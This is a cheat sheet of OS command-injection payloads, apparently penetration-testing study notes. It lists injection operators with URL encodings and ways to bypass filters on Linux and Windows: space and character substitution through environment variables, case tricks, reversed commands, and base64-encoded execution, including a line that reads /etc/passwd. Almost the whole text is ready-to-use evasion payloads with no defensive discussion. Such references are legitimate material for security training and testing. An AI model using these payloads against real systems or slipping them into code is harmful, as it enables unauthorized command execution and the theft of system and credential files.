### Injection Operators

# Semicolon
```
;  # %3b - Both systems
```

# New Line
```
\n  # %0a - Both systems
```

# Background
```
&  # %26 - Both systems (second output generally shown first)
```

# Pipe
```
|  # %7c - Both systems (only second output is shown)
```

# AND Operator
```
&&  # %26%26 - Both systems (only if first command succeeds)
```

# OR Operator
```
||  # %7c%7c - Executes second command if first fails
```

# Sub-Shell (Linux Only)
```
``  # %60%60 - Linux-only
$()  # %24%28%29 - Linux-only
```

### Linux - Filtered Character Bypass

# View Environment Variables
```
printenv  # Displays all environment variables
```

# Space Bypass
```
%09  # Use tabs instead of spaces
${IFS}  # Replaced with space or tab (Not usable in sub-shells)
{ls,-la}  # Commas replaced with spaces
```

# Other Character Bypass
```
${PATH:0:1}  # Replaced with /
${LS_COLORS:10:1}  # Replaced with ;
$(tr '!-}' '"-~'<<<[)  # Shift character by one ([ -> \)
```

# Blacklisted Command Bypass

## Character Insertion
```
' or "  # Total must be even
$@ or \  # Linux only
```

## Case Manipulation
```
$(tr "[A-Z]" "[a-z]"<<<"WhOaMi")  # Executes regardless of case
$(a="WhOaMi";printf %s "${a,,}")  # Another case manipulation method
```

## Reversed Commands
```
echo 'whoami' | rev  # Reverse a string
$(rev<<<'imaohw')  # Execute reversed command
```

## Encoded Commands
```
echo -n 'cat /etc/passwd | grep 33' | base64  # Encode with base64
bash<<<$(base64 -d<<<Y2F0IC9ldGMvcGFzc3dkIHwgZ3JlcCAzMw==)  # Execute base64 encoded string
```

### Windows - Filtered Character Bypass

# View Environment Variables (PowerShell)
```
Get-ChildItem Env:  # View all environment variables
```

# Space Bypass
```
%09  # Use tabs instead of spaces
%PROGRAMFILES:~10,-5%  # Replaced with space (CMD)
$env:PROGRAMFILES[10]  # Replaced with space (PowerShell)
```

# Other Character Bypass
```
%HOMEPATH:~0,-17%  # Replaced with \ (CMD)
$env:HOMEPATH[0]  # Replaced with \ (PowerShell)
```

# Blacklisted Command Bypass

## Character Insertion
```
' or "  # Total must be even
^  # Windows only (CMD)
```

## Case Manipulation
```
WhoAmi  # Odd case characters to bypass filters
```

## Reversed Commands
```
"whoami"[-1..-20] -join ''  # Reverse a string in PowerShell
iex "$('imaohw'[-1..-20] -join '')"  # Execute reversed command in PowerShell
```

## Encoded Commands
```
[Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes('whoami'))  # Encode with base64
iex "$([System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String('dwBoAG8AYQBtAGkA')))"  # Execute base64 encoded string
```
